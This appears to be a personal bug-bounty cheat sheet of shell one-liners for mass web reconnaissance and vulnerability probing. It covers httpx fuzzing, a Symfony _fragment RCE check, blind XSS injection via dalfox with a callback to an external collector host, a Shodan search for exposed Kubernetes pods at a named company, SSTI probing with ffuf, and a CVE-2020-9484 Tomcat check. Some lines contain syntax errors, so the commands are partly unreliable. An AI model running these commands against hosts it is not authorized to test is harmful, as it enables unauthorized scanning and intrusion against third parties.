**This oneliner was created by me for personal use**

### Oneliner to fuzz all hosts with wordlist using httpx and send every request to burpsuite for more investigations:- 

```bash
httpx -l hosts -paths dir.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -title -http-proxy http://127.0.0.1:8080
```

### Found bug with custom wordlist from robots.txt 

```bash
httpx -l urls.txt -paths /robots.txt -silent -o robots-url.txt
```

```bash
for url in $(cat robots-url.txt);do http -b $url | grep 'Disallow' | awk -F ' ' '{print $2}' | cut -c 2- | anew robot-words.txt;done
```

### RCE ONELINER WITH HTTPX

```bash
httpx -l hosts.txt -path /_fragment?_path=_controller=phpcredits&flag=-1 -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits"
```

```bash
cat pay-subdomains | sed 's/$/\/_fragment?_path=_controller=phpcredits&flag=-1/' | httpx -status-code
```

### Blind XSS Oneliner with dalfox 


```bash
assetfinder [host] | hakrawler -plain -usewayback -wayback | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -b your.xss.ht -o out.txt
```

### Find Kubernetes with shodan and httpx

```bash
shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
```

### Finding SSTI with ffuf 

```bash
cat subdomains | gau -subs |grep = |qsreplace "sstitest{{7*7}}" |ffuf -w - -u FUZZ -mr "sstitest49" -t 100 -o ./$chaos.ssti.txt ; done
```

### A POC for CVE-2020-9484

```bash
cat targets.txt | while read host do;do curl --insecure --silent -X GET $host/index.jsp -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy' | grep -qs "PersistentManagerBase" && \printf "$host \033[0;31mCVE-2020-948444\n"
```








